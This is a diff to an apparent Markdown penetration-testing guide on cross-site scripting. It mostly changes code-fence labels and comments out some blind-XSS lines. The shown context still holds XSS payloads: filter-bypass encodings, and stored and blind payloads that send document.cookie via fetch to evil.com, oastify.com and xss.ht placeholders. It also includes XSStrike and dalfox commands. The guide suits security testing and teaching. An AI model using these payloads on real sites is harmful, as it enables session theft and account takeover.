@@ -24,7 +24,7 @@
 
 Basic detection to confirm that the input point is controllable in the HTML context and the output is unencoded.
 
-```bash
+```text
 # Most basic detection -- if alert fires, XSS is confirmed
 https://target.com/search?q=<script>alert(1)</script>
 
@@ -45,7 +45,7 @@ https://target.com/search?q=<script>document.title='XSS'</script>
 
 Malicious payloads are submitted via URL parameters or forms, and the server embeds the input as-is into the response HTML.
 
-```bash
+```text
 # Basic detection -- confirm input point in HTML context
 https://target.com/search?q=<script>alert(1)</script>
 
@@ -70,7 +70,7 @@ https://target.com/search?q='-alert(1)-'
 
 Malicious payloads are persistently stored, and all users who access the data will trigger execution.
 
-```bash
+```text
 # User nickname/comment -- persistent malicious payload
 Username: <img src=x onerror=fetch('https://evil.com/steal?c='+document.cookie)>
 
@@ -148,7 +148,7 @@ Bypass keyword-based filters using different encoding methods.
 
 ### URL Encoding / Double Encoding
 
-```bash
+```text
 # URL encoding
 %3Cscript%3Ealert(1)%3C/script%3E
 
@@ -182,7 +182,7 @@ Bypass keyword-based filters using different encoding methods.
 
 ### Double Encoding
 
-```bash
+```text
 %253Cscript%253Ealert(1)%253C/script%253E
 ```
 
@@ -217,7 +217,7 @@ alert(1)>
 
 ### Null Byte Injection (some WAF parsing truncation)
 
-```bash
+```text
 <scr%00ipt>alert(1)</script>
 ```
 
@@ -312,8 +312,8 @@ Inject payloads with external callbacks in locations where the response cannot b
 
 ```bash
 # Use external callback server to verify execution
-"><script src=https://your-callback.oastify.com></script>
-"><img src=https://your-callback.oastify.com/log?c="+document.cookie>
+# "><script src=https://your-callback.oastify.com></script>
+# "><img src=https://your-callback.oastify.com/log?c="+document.cookie>
 
 # Use XSStrike blind mode
 python xsstrike.py -u "http://target.com/form" --blind
@@ -322,9 +322,9 @@ python xsstrike.py -u "http://target.com/form" --blind
 dalfox url "http://target.com/form" -b https://your-callback.oastify.com
 
 # XSS Hunter callback (professional blind XSS platform)
-"><script src=https://xsshunter.com/YOUR_PAYLOAD_ID></script>
-"'-alert(1)-'
-"><img src=x onerror="fetch('https://YOUR_SUBDOMAIN.xss.ht/?c='+document.cookie)">
+# payload: "><script src=https://xsshunter.com/YOUR_PAYLOAD_ID></script>
+# payload: "'-alert(1)-'
+# payload: "><img src=x onerror="fetch('https://YOUR_SUBDOMAIN.xss.ht/?c='+document.cookie)">
 ```
 
 ---
